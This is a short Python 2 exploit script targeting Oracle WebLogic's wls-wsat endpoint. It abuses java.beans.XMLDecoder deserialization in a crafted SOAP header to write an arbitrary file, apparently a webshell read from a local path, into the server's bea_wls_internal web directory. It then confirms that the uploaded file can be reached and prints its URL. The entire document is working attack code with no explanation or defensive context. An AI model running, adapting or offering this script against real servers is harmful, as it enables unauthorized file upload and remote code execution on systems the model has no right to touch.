#coding=utf-8
import requests
import sys
proxies = {"http":"http://127.0.0.1:8080"}
'''
html_escape_table = {
        "&": "&amp;",
        '"': "&quot;",
        "'": "&apos;",
        ">": "&gt;",
        "<": "&lt;",
    }
'''
def exp(url,upload_filename,local_file_path=''):
    headers = {'Content-type': 'text/xml'}
    shell = '''123'''
    if local_file_path != '':
        f = open(local_file_path,'r').read()
        shell = f.replace("&","&amp;").replace("'","&apos;").replace(">","&gt;").replace("<","&lt;")        
    xml = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><java version="1.4.0" class="java.beans.XMLDecoder"><object class="java.io.PrintWriter"><string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/%s</string><void method="println"><string>%s</string></void><void method="close"/></object></java></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope> '''%(upload_filename,shell)
    res = requests.post('http://%s/wls-wsat/CoordinatorPortType'%(url), headers=headers, data=xml,proxies=proxies)
    if res.status_code != 404:
        res = requests.head('http://%s/bea_wls_internal/%s'%(url,upload_filename),proxies=proxies).status_code
        if res != 404:
            print 'ok! file_path: http://%s/bea_wls_internal/%s'%(str(url),str(upload_filename))
        else:
            print 'create file error'
    else:
        print 'no!'
if __name__ == '__main__':
    if len(sys.argv)<3:
        print '''
please use python weblogic.py host:port upload_filename local_file_path
        '''
        sys.exit(0)
    url = sys.argv[1]
    upload_filename = sys.argv[2]
    try:
        local_file_path = sys.argv[3]
    except:
        local_file_path = ''
    exp(url,upload_filename,local_file_path)
